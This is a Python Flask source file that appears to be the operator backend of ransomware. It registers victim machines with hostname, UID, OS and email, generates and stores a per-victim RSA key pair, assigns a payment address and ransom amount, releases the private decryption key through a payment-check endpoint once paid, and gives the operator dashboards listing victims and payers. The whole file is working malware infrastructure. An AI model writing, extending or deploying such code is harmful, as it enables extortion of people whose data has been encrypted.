from flask import render_template, request, redirect, url_for, flash, jsonify
from flask_login import login_user, current_user, login_required, logout_user
from application.models import *
from utilities.gen_rsa import gen_keys
import random, string
from app import login_manager, csrf, limiter
from werkzeug.security import check_password_hash
from application.forms import LoginForm
from application.models import Users, UsersPaid



@app.route("/new-user", methods=["POST"])
@csrf.exempt
def new_user():
    try:
        data = request.json
        keys = gen_keys()
        new_user = Users(
            username=data.get("Username"),
            hostname=data.get("Hostname"),
            uid=data.get("UID"),
            os_name=data.get("OS"),
            os_version=data.get("Version"),
            os_architecture=data.get("Architecture"),
            email=data.get("User Email"),
            public_key=keys[1],
            private_key=keys[0],
            crypto_address=''.join(random.choices(string.ascii_letters + string.digits, k=16)),
            total_payment=100,
            status=False,
            amount_paid=0
        )

        db.session.add(new_user)
        db.session.commit()

        return jsonify({"message": "User and keys added successfully."}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/check-payment", methods=["POST"])
def check_payment():
    try:
        data = request.json
        uid = data.get('uid') if data else None
        if not uid:
            return jsonify({"error": "Request failed."}), 400

        paid_user = UsersPaid.query.filter_by(uid=uid).first()
        if paid_user and paid_user.status:
            return jsonify({
                "STATUS": "SUCCESS",
                "PRIVATE_KEY": str(paid_user.private_key)
            }), 200
        else:
            return jsonify({"error": "Payment not yet complete."}), 400

    except Exception as e:
        return jsonify({"error": "Request failed, try again."}), 400


@login_manager.user_loader
def load_user(user_id):
    return Administrator.query.get(int(user_id))


@app.route("/login", methods=["GET", "POST"])
def login():
    form = LoginForm()
    if current_user.is_authenticated:
        return redirect(url_for('dashboard'))
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        remember = True if request.form.get("remember_me") else False

        user = Administrator.query.filter_by(username=username).first()
        if user and check_password_hash(user.password, password):
            login_user(user, remember=remember)
            return redirect(url_for('dashboard'))
        else:
            flash('Invalid username or password.', 'danger')

    return render_template("login.html", form=form)


@app.route('/send-message', methods=['POST'])
@csrf.exempt
@limiter.limit("1 per 10 seconds")
def send_message():
    data = request.get_json()
    if not data or 'UID' not in data or 'Message' not in data:
        return jsonify({"status": "error", "message": "Missing UID or Message in request"}), 400

    user = Users.query.filter_by(uid=data['UID']).first()

    if not user:
        return jsonify({"status": "error", "message": "User does not exist"}), 404

    message = Message(uid=data['UID'], content=data['Message'])
    db.session.add(message)
    db.session.commit()

    return jsonify({"status": "success", "message": "Message sent successfully"}), 200



@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('login'))


@login_required
@app.route("/dashboard", methods=["GET", "POST"])
def dashboard():
    return render_template("dashboard/dashboard.html", active_page='dashboard')


@login_required
@app.route("/databases", methods=["GET", "POST"])
def databases():
    users = Users.query.all()
    users_paid = UsersPaid.query.all()
    return render_template("dashboard/databases.html", active_page='databases', users=users, users_paid=users_paid)


@login_required
@app.route("/messages", methods=["GET", "POST"])
def messages():
    return render_template("dashboard/messages.html", active_page='tickets')


@login_required
@app.route("/notifications", methods=["GET", "POST"])
def notifications():
    return render_template("dashboard/notifications.html", active_page='notifications', notifications_count=10)


@login_required
@app.route("/manage-users", methods=["GET", "POST"])
def manage_users():
    return render_template("dashboard/user_management.html", active_page='manage_users')


@app.errorhandler(429)
def ratelimit_error(e):
    return jsonify({"status": "error", "message": "Too many requests. Please slow down."}), 429

#
